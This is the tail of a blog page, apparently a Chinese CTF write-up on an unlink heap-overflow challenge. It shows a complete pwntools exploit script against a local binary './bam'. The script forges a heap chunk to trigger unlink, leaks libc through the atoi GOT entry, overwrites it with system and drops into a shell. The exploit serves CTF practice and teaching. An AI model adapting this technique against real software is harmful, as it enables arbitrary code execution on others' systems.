+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./bam&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_item</span>(<span class="params">size,content</span>):</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_item</span>(<span class="params">index,size,content</span>):</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_item</span>(<span class="params">index</span>):</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_item</span>():</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_item(<span class="number">0x80</span>,<span class="string">&quot;a&quot;</span>) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add_item(<span class="number">0x80</span>,<span class="string">&quot;b&quot;</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add_item(<span class="number">0x80</span>,<span class="string">&quot;c&quot;</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change_item(<span class="number">1</span>,<span class="number">0x200</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x6020d8</span>-<span class="number">0x18</span>)+p64(<span class="number">0x6020d8</span>-<span class="number">0x10</span>)+<span class="string">&quot;A&quot;</span>*(<span class="number">0x60</span>)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">remove_item(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = <span class="number">0x602068</span></span><br><span class="line"></span><br><span class="line">change_item(<span class="number">1</span>,<span class="number">0x80</span>,p64(<span class="number">0</span>)+p64(atoi_got))</span><br><span class="line"></span><br><span class="line">show_item()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;0 : &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">0x36e90</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc------&gt;&quot;</span>,<span class="built_in">hex</span>(libc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libc + <span class="number">0x453a0</span></span><br><span class="line"></span><br><span class="line">change_item(<span class="number">0</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">unlink-堆溢出题目</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&text=unlink-堆溢出题目"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&title=unlink-堆溢出题目"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&is_video=false&description=unlink-堆溢出题目"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=unlink-堆溢出题目&body=Check out this article: http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&title=unlink-堆溢出题目"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&title=unlink-堆溢出题目"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&title=unlink-堆溢出题目"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&title=unlink-堆溢出题目"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&name=unlink-堆溢出题目&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/08/unlink-%E5%A0%86%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE/&t=unlink-堆溢出题目"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
